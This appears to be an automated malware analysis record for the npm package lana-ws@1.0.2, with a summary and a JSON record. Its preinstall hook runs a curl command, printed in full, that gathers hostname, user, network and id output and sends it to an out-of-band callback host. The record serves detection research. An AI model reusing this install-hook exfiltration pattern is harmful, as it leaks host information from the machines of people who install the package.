# npm lana-ws@1.0.2

**Source:** datadog · **Source label:** malicious · **Released:** 2024-12-13 (registry) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

The package contains only a package.json whose preinstall hook runs an inline shell command on every registry install. The command collects `hostname`, `whoami`, `ifconfig`, `pwd` and `id` output through command substitution and posts it with `/usr/bin/curl --data-urlencode` to an oastify (Burp Collaborator style) host, `e8n69tphwtplgm6itmwij8wnze56tyhn[.]oastify[.]com`. There are no gates: no shell conditionals, no manifest os/cpu restrictions and no other files. Any POSIX environment with curl at `/usr/bin/curl` and outbound HTTP to that host triggers the full behaviour.

## Execution

- **preinstall** `/usr/bin/curl --data-urlencode  "info=$(hostname && whoami && ifconfig && pwd && id)" e8n69tphwtplgm6itmwij8wnze56tyhn[.]oastify[.]com`: no package files; inline_shell.

## Gates

None.

## Requirements

- network: e8n69tphwtplgm6itmwij8wnze56tyhn[.]oastify[.]com:80 (curl posts the collected host info over plain HTTP to this OAST host)
- installed_tool: curl, hostname, whoami, ifconfig, id (the hook calls /usr/bin/curl by absolute path; the && chain needs each recon tool to succeed for the full output)
- os: linux (POSIX sh command substitution and /usr/bin/curl path; fails under cmd.exe on Windows (macOS also works in principle))

## Behaviour

- Ungated: recon, exfil
- Gated: none

## Notes

- `attack_type` is dependency_confusion by inference: an unscoped, generic-looking name with no code, a zero-content manifest and an OAST callback that fingerprints the host is the usual shape of a dependency confusion probe. Nothing in the package proves an internal name is targeted.
- The prefilled launch style `download_then_exec` was replaced by `inline_shell`; curl only sends data.
- The `&&` chain inside `$()` truncates the collected output if a tool is missing (ifconfig is often absent on minimal images), but curl still sends the request.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "lana-ws",
    "version": "1.0.2",
    "archive_sha256": "9f913bc7de239c6ec11e6a057a51759c04996a634272dc3346067674536a2430",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2024-12-13",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/malicious_intent/2024-12-13-lana-ws-v1.0.2.zip",
    "package_root": "layer0/tmp/tmphghwerqp/lana-ws/package",
    "cluster_key": "fc448db40f21e6b0b04ac313f09c0b2d9b46b90398f3a19712517bdea593abd3",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "preinstall",
        "command": "/usr/bin/curl --data-urlencode  \"info=$(hostname && whoami && ifconfig && pwd && id)\" e8n69tphwtplgm6itmwij8wnze56tyhn[.]oastify[.]com",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "sh",
        "launch_style": [
          "inline_shell"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "The package holds only package.json. The preinstall hook string was read in full; there are no other files, no main file and no shell conditionals, so nothing is gated.",
      "Launch style corrected from download_then_exec to inline_shell: curl only posts data, nothing fetched is run.",
      "The && chain inside $() stops collecting at the first failing command (for example ifconfig missing on minimal images), but curl still sends whatever was collected. Not a gate, just a prerequisite."
    ]
  },
  "requirements": [
    {
      "axis": "network",
      "value": "e8n69tphwtplgm6itmwij8wnze56tyhn[.]oastify[.]com:80",
      "reason": "curl posts the collected host info over plain HTTP to this OAST host"
    },
    {
      "axis": "installed_tool",
      "value": [
        "curl",
        "hostname",
        "whoami",
        "ifconfig",
        "id"
      ],
      "reason": "the hook calls /usr/bin/curl by absolute path; the && chain needs each recon tool to succeed for the full output"
    },
    {
      "axis": "os",
      "value": "linux",
      "reason": "POSIX sh command substitution and /usr/bin/curl path; fails under cmd.exe on Windows (macOS also works in principle)"
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "recon",
      "exfil"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "e8n69tphwtplgm6itmwij8wnze56tyhn[.]oastify[.]com",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "dependency_confusion",
  "family_hint": "OAST recon callback",
  "claude_assessment": "malicious",
  "assessment_reason": "The preinstall hook runs hostname, whoami, ifconfig, pwd and id and posts the output with curl to an out-of-band interaction (oastify) host on every install, with no gate. This is an unconditional host fingerprint exfiltration typical of dependency confusion probes.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [],
    "candidate_set": {
      "generator": "gate_extract@44d785b257",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
